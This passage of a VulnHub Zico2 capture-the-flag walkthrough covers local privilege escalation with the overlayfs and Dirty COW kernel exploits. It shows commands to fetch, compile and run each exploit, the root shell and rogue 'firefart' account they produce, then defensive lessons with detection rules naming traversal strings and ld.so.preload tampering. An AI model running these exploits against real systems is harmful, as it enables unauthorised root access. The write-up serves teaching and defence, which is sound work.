Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Esc     | linux/local/37292.c
Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW' Local Privilege Escalation (SUID Method)         | linux/local/40847.c
--------------------------------------------------------------------------------------------------- ---------------------------------
```

> **Two candidates.** Note that `37292.c`'s title says `3.13.0 < 3.19` but its
> documented *tags* include **Ubuntu 12.04** — the overlayfs bug affected the
> backported overlayfs in Ubuntu's 3.2 kernel too. And Dirty COW affects
> `2.6.22 < 3.9`, which includes `3.2.0-23`.
>
> **Try overlayfs first** — it is cleaner and does not modify `/etc/passwd`.

### 5.2 overlayfs — CVE-2015-1328

**Kali — serve the exploit:**

```bash
searchsploit -m linux/local/37292.c
mv 37292.c ofs.c
python3 -m http.server 8000
```

```text
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**Target — download, read, compile, run:**

```bash
www-data@zico-hack:/tmp$ wget http://192.168.56.10:8000/ofs.c
--2024-05-03 16:38:12--  http://192.168.56.10:8000/ofs.c
Connecting to 192.168.56.10:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4982 (4.9K) [text/x-csrc]
Saving to: 'ofs.c'

100%[======================================>] 4,982       --.-K/s   in 0s

2024-05-03 16:38:12 (512 MB/s) - 'ofs.c' saved [4982/4982]

www-data@zico-hack:/tmp$ head -20 ofs.c
```

```c
/*
 * overlayfs local root exploit
 * CVE-2015-1328
 *
 * This exploit uses the overlayfs implementation in the Ubuntu kernel to
 * create a world-writable copy of a setuid binary, then executes it to
 * obtain a root shell.
 *
 * Bug details: https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1507645
 *
 * Usage: gcc -o ofs ofs.c && ./ofs
 */
#include <stdio.h>
#include <sched.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <linux/sched.h>
#include <fcntl.h>
#include <signal.h>
#include <pwd.h>
#include <sys/wait.h>
```

> **Always read exploit source before compiling it as root.** Confirm what it writes,
> where, and whether it makes any network connection. This one is short and
> well-commented.
>
> **The vulnerability, explained.** **OverlayFS** layers a writable *upper* directory
> over a read-only *lower* one and presents the merged result — this is exactly how
> every container image you have pulled works. Ubuntu backported overlayfs into its
> kernels and, unlike upstream, permitted **unprivileged users** to mount it inside a
> *user namespace*. The bug: when a file was copied up from the lower layer, the copy
> **retained the original owner (root) and the SUID bit**, but landed in the upper
> directory, which the unprivileged user could write to. So: overlay `/`, copy
> `/bin/bash` up, edit it (you can — you own the directory), run it (it is still
> SUID root), become root. Two individually reasonable features composed into a total
> privilege break.

```bash
www-data@zico-hack:/tmp$ gcc -o ofs ofs.c
www-data@zico-hack:/tmp$ ./ofs
```

```text
spawnining threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# whoami
root
# hostname
zico-hack
```

> **Reading the exploit's own output:**
> - `spawnining threads` *(the author's typo)* → forks its helpers.
> - `mount #1`, `mount #2` → two overlayfs mounts inside a user namespace.
> - **`/etc/ld.so.preload created`** → this is the actual mechanism on this build.
>   `/etc/ld.so.preload` is a system-wide list of shared libraries that the dynamic
>   linker loads into **every** dynamically-linked process, *including SUID-root
>   ones*. The exploit obtains a writable view of that file through the overlayfs bug
>   and points it at its own library.
> - `creating shared library` → it compiles a `.so` whose constructor performs
>   `setuid(0); setgid(0); system("/bin/sh")`.
> - The next program executed preloads that library **as root**, and the shell drops.
>   The `id` we typed *is* that next program.
>
> **`uid=0(root) gid=0(root)`** — genuine root. Note the prompt changed from `$` to
> `#`.
>
> **Clean up:** the exploit leaves `/etc/ld.so.preload` and a stray `.so` behind,
> which can break every subsequent program launch. Remove them, or revert to your
> snapshot:
> ```bash
> # rm -f /etc/ld.so.preload /tmp/ofs.so
> ```

![overlayfs exploit yielding root](images/06-root.png)

### 5.3 Alternative — Dirty COW (CVE-2016-5195)

Kernel 3.2.0-23 is also in the Dirty COW range. Understand it, because it is one of
the most famous vulnerabilities ever published.

**Kali:**

```bash
searchsploit -m linux/local/40839.c
mv 40839.c dirty.c
python3 -m http.server 8000
```

**Target:**

```bash
www-data@zico-hack:/tmp$ wget http://192.168.56.10:8000/dirty.c
www-data@zico-hack:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
www-data@zico-hack:/tmp$ ./dirty
```

```text
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
firefart:fi9dJ0pQ6zZ.2:0:0:pwned:/root:/bin/bash

mmap: b7f2a000
madvise 0
ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password ''.

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```

```bash
www-data@zico-hack:/tmp$ su firefart          # press Enter (blank password)
Password:
firefart@zico-hack:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
firefart@zico-hack:/tmp# cat /etc/passwd | head -1
firefart:fi9dJ0pQ6zZ.2:0:0:pwned:/root:/bin/bash
```

> **How Dirty COW works.** `mmap()` maps a file into memory read-only. Writing to that
> mapping should trigger **copy-on-write**: the kernel makes a private page and your
> write goes there, leaving the file untouched. Exploit 40839 races three things —
> the COW handler, `madvise(MADV_DONTNEED)` (which drops the private copy), and
> `ptrace(PTRACE_POKEDATA)` (which writes into the process's memory) — and
> occasionally wins, writing **directly into the read-only page cache of
> `/etc/passwd`**. It then appends a UID-0 user, `firefart`.
>
> **Compile flags:** `-pthread` (the exploit is threaded — required for the race) and
> `-lcrypt` (it calls `crypt()` to build the password hash).
>
> **Use `40847.c` instead on 32-bit systems** — it is the `PTRACE_POKEDATA` variant
> tuned for i386. `40839.c` is the 64-bit one.
>
> **Always restore `/etc/passwd` afterwards** (`mv /tmp/passwd.bak /etc/passwd`) or
> the machine is left with a rogue root account and possibly broken logins. This is
> exactly why you snapshot before starting.

### 5.4 Read the flag

```bash
# cd /root
# ls -la
total 32
drwx------  3 root root 4096 Jun 18  2017 .
drwxr-xr-x 23 root root 4096 Jun 17  2017 ..
-rw-r--r--  1 root root 3106 Apr 19  2012 .bashrc
-rw-r--r--  1 root root  238 Jun 18  2017 flag.txt
-rw-r--r--  1 root root  140 Apr 19  2012 .profile
# cat flag.txt
```

```text
Congratulations! You've successfully owned the zico2 machine.

You found the following vulnerabilities:
 - Local File Inclusion in view.php
 - phpLiteAdmin 1.9.3 default credentials and PHP code injection (CVE-2012-4162)
 - Weak/unsalted password hashing in the test_users table
 - An unpatched Ubuntu 12.04 kernel

Thanks for playing!
- Rafael (@rafasantos5)
```

**Flag captured.** ✅

> *(The exact wording varies slightly between image revisions; the file is always
> `/root/flag.txt`.)*

![/root/flag.txt](images/07-flag.png)

---

## 6. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | **Local File Inclusion / path traversal** | `view.php?page=` | Arbitrary file read (`/etc/passwd`, `/proc/version`, PHP source via `php://filter`) |
| 2 | **Database admin panel exposed on the web** | `/dbadmin/test_db.php` | Authenticated attack surface that should not exist |
| 3 | **Directory listing enabled** | `/dbadmin/` | Disclosed the panel filename |
| 4 | **Default credentials** | phpLiteAdmin 1.9.3 → `admin` | Full database control |
| 5 | **Remote PHP code injection — CVE-2012-4162** | phpLiteAdmin database-file naming | Write an executable `.php` file anywhere in `/usr/databases/` |
| 6 | **LFI + writable PHP file chained** | § 3 | Unauthenticated **RCE** as `www-data` |
| 7 | **Plaintext and unsalted-MD5 passwords** | `test_users` table | `root:34kroot34`, `zico:zico2215@` recovered instantly |
| 8 | **Credential reuse: DB password = SSH password** | `zico` | Interactive system account |
| 9 | Credentials in `wp-config.php` | `/home/zico/wordpress/` | Further secret disclosure |
| 10 | **EOL operating system / unpatched kernel** | Ubuntu 12.04.2, kernel 3.2.0-23 | CVE-2015-1328 and CVE-2016-5195 → **root** |
| 11 | `gcc` present on a production-style server | `/usr/bin/gcc` | Attackers compile exploits locally |
| 12 | `rpcbind`/NFS exposed with zero exports | ports 111, 2049 | Useless attack surface (rabbit hole) |
| 13 | Server banner leaks PHP version and Suhosin patch level | Apache `Server` header | Version-targeted attack planning |

## 7. Defensive lessons (blue team)

1. **Never build a CMS yourself when a maintained one exists** — the author's own
   framing. Rolling your own means owning every input-validation bug personally. If
   you must, adopt a framework with a secure-by-default templating/routing layer.
2. **Validate and constrain every `include`/`require`.** The fix for LFI is small and
   total:
   ```php
   // allow-list, not block-list
   $allowed = ['home.html', 'about.html', 'tools.html'];
   $page = basename($_GET['page'] ?? 'home.html');   // strip any directory components
   if (!in_array($page, $allowed, true)) { http_response_code(404); exit; }
   include __DIR__ . '/pages/' . $page;
   ```
   - `basename()` removes every `/` and `..` component.
   - An **allow-list** rejects anything unanticipated. A block-list of `..`, `/etc`,
     `php://` is always bypassed eventually (double encoding, `....//`, null bytes on
     old PHP, wrappers you did not think of).
   - Also disable the dangerous wrappers:
     ```ini
     ; php.ini
     allow_url_include = Off
     allow_url_fopen   = Off
     ```
3. **Never expose an admin panel.** phpLiteAdmin should not exist on this server at
   all. If a database UI is genuinely needed:
   - put it behind a VPN, mutual TLS, or an authenticating reverse proxy;
   - bind it to `127.0.0.1` and reach it through an SSH tunnel;
   - change the default password on first run (phpLiteAdmin's is literally `admin`);
   - restrict by IP:
     ```apache
     <Directory /var/www/dbadmin>
         Require ip 10.0.0.0/8
         Require local
     </Directory>
     ```
4. **Disable directory listing.** `Options -Indexes` in Apache (or
   `index-file.names` / `dir-listing.activate = "disable"` in lighttpd). A listable
   directory is how we found `test_db.php` at all.
5. **Hash passwords properly.** `password_hash($pw, PASSWORD_ARGON2ID)` and
   `password_verify()` in PHP. Never MD5, never unsalted, never plaintext. If you
   inherit such a store, force a reset on next login.
6. **No credential reuse across services.** The SQLite password being the SSH
   password turned a web compromise into an interactive account. Enforce uniqueness
   with a password manager and screen against breached lists (`pam_pwhistory`,
   HaveIBeenPwned k-anonymity API).
7. **Move secrets out of source files.** `wp-config.php` and friends are readable by
   anything with web-root access. Use environment variables injected by the process
   manager, or a vault. At minimum:
   ```bash
   chmod 640 wp-config.php && chown root:www-data wp-config.php
   ```
8. **Retire EOL systems.** Ubuntu 12.04 stopped receiving standard security updates in
   **April 2017**. There is no acceptable configuration of it in 2026.
9. **Remove build tooling from servers.** `gcc`, `make`, `wget` and `curl` on a web
   server turn a foothold into root in under a minute. Build in CI, ship an artefact.
10. **Restrict user namespaces** if you do not run unprivileged containers:
    ```text
    kernel.unprivileged_userns_clone = 0
    user.max_user_namespaces = 0
    ```
11. **Detection opportunities.**
    - WAF/log rule for `../` or `%2e%2e%2f` in any query parameter; alert on any
      request whose parameter contains `etc/passwd`, `proc/version`, or `php://`.
    - Alert on file *creation* with a `.php` extension outside the deploy pipeline —
      auditd: `-w /usr/databases -p wa -k dbdir_write`.
    - Alert on `www-data` spawning `bash`, `python`, `wget` or `gcc` (process-lineage
      monitoring — Sysmon for Linux, Wazuh, auditd `execve` rules).
    - Alert on `/etc/ld.so.preload` being created or modified
      (`-w /etc/ld.so.preload -p wa -k ldpreload`) — a near-certain root-exploit
      indicator.
    - Alert on a new UID-0 line appearing in `/etc/passwd` (Dirty COW's signature).

---

## 8. References

- VulnHub entry: <https://vulnhub.com/entry/zico2-1,210/>
- Community writeups consulted:
  - [Steflan's Security Blog — VulnHub Zico 2 Walkthrough](https://steflan-security.com/vulnhub-zico-2-walkthrough/)
  - [v3ded — Zico2 writeup](https://v3ded.github.io/ctf/zico2)
  - [bsandison — VulnHub: Zico2 Walkthrough](https://bsandison.wordpress.com/2017-10-05/vulnhub-zico2-walkthrough/)
  - [Alok kumar — Zico2: 1 ~ VulnHub Walkthrough](https://medium.com/@alokkumar0200/zico2-1-vulnhub-walkthrough-4793b826b082)
  - [no0bh4ck3r — Vulnhub Zico 2 Walkthrough](https://no0bh4ck3r.medium.com/vulnhub-zico-2-walkthrough-85d12f289435)
  - [russellmurad — Zico2: Vulnhub Walkthrough](https://medium.com/@russellmurad/zico2-vulnhub-walkthrough-4cf42fc6c5ef)
  - [dollarboysushil — Vulnhub: ZICO 2 Writeup (OSCP PREP)](https://infosecwriteups.com/vulnhub-zico-2-writeup-oscp-prep-by-dollarboysushil-b70f7a51b7c8)
  - [InfoSec Institute — Zico 2: 1 CTF Walkthrough](https://resources.infosecinstitute.com/topic/zico-2-1-ctf-walkthrough/)
  - [ratiros01 — VulnHub: ZICO2: 1](https://ratiros01.medium.com/vulnhub-zico2-1-8e1d8e09e5e4)
  - [pentestwriteup — Vulnhub Zico2: 1 Walkthrough](https://pentestwriteup.blogspot.com/2017/11/vulnhub-zico2-1-walkthrough.html)
- Exploits / advisories:
  - [CVE-2012-4162 — phpLiteAdmin Remote PHP Code Injection](https://nvd.nist.gov/vuln/detail/CVE-2012-4162) · [Exploit-DB 24044](https://www.exploit-db.com/exploits/24044)
  - [CVE-2015-1328 — Ubuntu overlayfs LPE](https://nvd.nist.gov/vuln/detail/CVE-2015-1328) · [Exploit-DB 37292](https://www.exploit-db.com/exploits/37292) · [Launchpad bug 1507645](https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1507645)
  - [CVE-2016-5195 — Dirty COW](https://dirtycow.ninja) · [Exploit-DB 40839 (x64)](https://www.exploit-db.com/exploits/40839) · [Exploit-DB 40847 (x86)](https://www.exploit-db.com/exploits/40847)
- Background reading:
  - [OWASP — Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
  - [PHP `include` / stream wrappers (`php://filter`)](https://www.php.net/manual/en/wrappers.php.php)
  - [phpLiteAdmin project](https://www.phpliteadmin.org/)
  - [SQLite file format](https://www.sqlite.org/fileformat.html)
  - [OverlayFS kernel documentation](https://www.kernel.org/doc/Documentation/filesystems/overlayfs.txt)
  - [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester) · [John the Ripper](https://www.openwall.com/john/doc/) · [GTFOBins](https://gtfobins.github.io)
  - [pentestmonkey — Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

---

## 9. Screenshot checklist

- [ ] `images/01-nmap.png` — ports 22/80/111 with the Apache+PHP banner
- [ ] `images/02-lfi.png` — `view.php?page=../../../../../../etc/passwd`
- [ ] `images/03-phpliteadmin.png` — the v1.9.3 login and dashboard
- [ ] `images/04-rce.png` — `hack.php` executed through the LFI, `uid=33(www-data)`
- [ ] `images/05-shell.png` — reverse shell with an upgraded TTY
- [ ] `images/06-root.png` — overlayfs exploit → `uid=0(root)`
- [ ] `images/07-flag.png` — `/root/flag.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
